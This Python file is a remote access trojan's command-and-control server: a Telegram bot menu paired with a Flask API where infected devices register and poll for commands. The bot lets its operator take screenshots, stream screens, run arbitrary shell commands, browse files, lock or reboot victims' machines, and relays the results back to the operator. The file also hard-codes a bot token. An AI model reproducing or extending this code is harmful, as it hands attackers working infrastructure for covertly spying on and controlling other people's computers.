import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import time
import threading
from datetime import datetime
import requests

BOT_TOKEN = "8682273233:AAG-t_tGwyplX8prlpY0iABMMJqitliNomU"
ADMIN_ID = 6778865145  # ЗАМЕНИТЕ НА ВАШ TELEGRAM ID

bot = telebot.TeleBot(BOT_TOKEN)
devices = {}
user_sessions = {}

# ========== МЕНЮ ==========
def main_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("🖥️ УСТРОЙСТВА", callback_data="devices"),
        InlineKeyboardButton("📊 СТАТИСТИКА", callback_data="stats"),
        InlineKeyboardButton("⚙️ НАСТРОЙКИ", callback_data="settings")
    )
    return markup

def device_control_menu(device_id, device_name):
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("📸 СКРИНШОТ", callback_data=f"scr_{device_id}"),
        InlineKeyboardButton("🎥 СТРИМ", callback_data=f"stream_{device_id}"),
        InlineKeyboardButton("💻 CMD", callback_data=f"cmd_{device_id}"),
        InlineKeyboardButton("📂 ФАЙЛЫ", callback_data=f"files_{device_id}"),
        InlineKeyboardButton("🔊 ЗВУК", callback_data=f"beep_{device_id}"),
        InlineKeyboardButton("🔒 БЛОКИРОВКА", callback_data=f"lock_{device_id}"),
        InlineKeyboardButton("🔄 ПЕРЕЗАГРУЗКА", callback_data=f"reboot_{device_id}"),
        InlineKeyboardButton("❌ УДАЛИТЬ", callback_data=f"del_{device_id}")
    )
    markup.add(InlineKeyboardButton("🔙 НАЗАД", callback_data="back"))
    return markup

# ========== ОТПРАВКА КОМАНД НА RAT ==========
def send_command_to_rat(device_id, command, value=None):
    """Отправляет команду на устройство через API"""
    try:
        payload = {"device_id": device_id, "command": command, "value": value}
        # Здесь нужно указать IP сервера с rat.py или использовать прямое API
        # В данном случае RAT сам ходит за командами, поэтому просто сохраняем
        if device_id not in devices:
            return False
        devices[device_id]['pending_command'] = {"command": command, "value": value}
        return True
    except:
        return False

# ========== КОМАНДЫ БОТА ==========
@bot.message_handler(commands=['start'])
def start(message):
    if message.chat.id != ADMIN_ID:
        bot.send_message(message.chat.id, "⛔ ДОСТУП ЗАПРЕЩЁН")
        return
    bot.send_message(message.chat.id, "🔐 RAT CONTROLLER v4.0\nВыбери действие:", reply_markup=main_menu())

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    if call.message.chat.id != ADMIN_ID:
        return

    if call.data == "devices":
        show_devices(call)
    elif call.data == "stats":
        show_stats(call)
    elif call.data == "settings":
        show_settings(call)
    elif call.data == "back":
        bot.edit_message_text("Главное меню", call.message.chat.id, call.message.message_id, reply_markup=main_menu())

    elif call.data.startswith("select_"):
        device_id = call.data[7:]
        dev = devices.get(device_id, {})
        text = f"📱 {dev.get('name')}\n🆔 {device_id}\n🌍 IP: {dev.get('ip')}\n📡 {dev.get('status')}"
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id,
                              reply_markup=device_control_menu(device_id, dev.get('name')))

    elif call.data.startswith("scr_"):
        device_id = call.data[4:]
        send_command_to_rat(device_id, "screenshot")
        bot.answer_callback_query(call.id, "📸 Команда отправлена")

    elif call.data.startswith("stream_"):
        device_id = call.data[7:]
        send_command_to_rat(device_id, "stream")
        bot.answer_callback_query(call.id, "🎥 Стрим запущен")

    elif call.data.startswith("cmd_"):
        device_id = call.data[4:]
        msg = bot.send_message(call.message.chat.id, "💻 Введите команду CMD:")
        user_sessions[call.message.chat.id] = {'device_id': device_id, 'action': 'cmd'}
        bot.answer_callback_query(call.id, "💻 Ожидаю команду")

    elif call.data.startswith("files_"):
        device_id = call.data[6:]
        send_command_to_rat(device_id, "files")
        bot.answer_callback_query(call.id, "📂 Команда отправлена")

    elif call.data.startswith("beep_"):
        device_id = call.data[5:]
        send_command_to_rat(device_id, "beep")
        bot.answer_callback_query(call.id, "🔊 Бип!")

    elif call.data.startswith("lock_"):
        device_id = call.data[5:]
        send_command_to_rat(device_id, "lock")
        bot.answer_callback_query(call.id, "🔒 Блокировка")

    elif call.data.startswith("reboot_"):
        device_id = call.data[7:]
        send_command_to_rat(device_id, "reboot")
        bot.answer_callback_query(call.id, "🔄 Перезагрузка")

    elif call.data.startswith("del_"):
        device_id = call.data[4:]
        devices.pop(device_id, None)
        show_devices(call)

@bot.message_handler(func=lambda msg: msg.chat.id == ADMIN_ID and msg.chat.id in user_sessions)
def handle_command(msg):
    session = user_sessions.pop(msg.chat.id, None)
    if session and session['action'] == 'cmd':
        send_command_to_rat(session['device_id'], "cmd", msg.text)
        bot.send_message(msg.chat.id, f"✅ Команда '{msg.text}' отправлена")

def show_devices(call):
    if not devices:
        bot.edit_message_text("❌ Нет устройств", call.message.chat.id, call.message.message_id)
        return
    markup = InlineKeyboardMarkup(row_width=1)
    for dev_id, dev in devices.items():
        status = "🟢" if dev.get('status') == "online" else "🔴"
        markup.add(InlineKeyboardButton(f"{status} {dev.get('name')}", callback_data=f"select_{dev_id}"))
    markup.add(InlineKeyboardButton("🔙 НАЗАД", callback_data="back"))
    bot.edit_message_text("📱 ВЫБЕРИ УСТРОЙСТВО:", call.message.chat.id, call.message.message_id, reply_markup=markup)

def show_stats(call):
    total = len(devices)
    online = sum(1 for d in devices.values() if d.get('status') == "online")
    text = f"📊 СТАТИСТИКА\n🖥️ Всего: {total}\n🟢 Онлайн: {online}\n🔴 Оффлайн: {total - online}"
    bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 НАЗАД", callback_data="back")))

def show_settings(call):
    bot.edit_message_text("⚙️ НАСТРОЙКИ (в разработке)", call.message.chat.id, call.message.message_id, reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 НАЗАД", callback_data="back")))

# ========== API ДЛЯ RAT ==========
from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route('/register', methods=['POST'])
def register():
    data = request.json
    device_id = data.get('device_id')
    devices[device_id] = {
        'name': data.get('name'),
        'ip': data.get('ip'),
        'os': data.get('os'),
        'status': 'online',
        'last_seen': time.time(),
        'pending_command': None
    }
    print(f"[+] Устройство зарегистрировано: {data.get('name')}")
    return jsonify({"status": "ok"})

@app.route('/heartbeat', methods=['POST'])
def heartbeat():
    device_id = request.json.get('device_id')
    if device_id in devices:
        devices[device_id]['status'] = 'online'
        devices[device_id]['last_seen'] = time.time()
    return jsonify({"status": "ok"})

@app.route('/get_command', methods=['POST'])
def get_command():
    device_id = request.json.get('device_id')
    if device_id in devices and devices[device_id].get('pending_command'):
        cmd = devices[device_id]['pending_command']
        devices[device_id]['pending_command'] = None
        return jsonify(cmd)
    return jsonify({"command": None, "value": None})

@app.route('/send_result', methods=['POST'])
def send_result():
    data = request.json
    device_id = data.get('device_id')
    result = data.get('result')
    print(f"[+] Результат от {device_id}: {result[:100]}")
    # Отправляем результат админу в Telegram
    bot.send_message(ADMIN_ID, f"📟 РЕЗУЛЬТАТ С {device_id}:\n```\n{result[:3000]}```", parse_mode='Markdown')
    return jsonify({"status": "ok"})

def run_api():
    app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)

threading.Thread(target=run_api, daemon=True).start()
print("✅ Бот запущен")
bot.infinity_polling()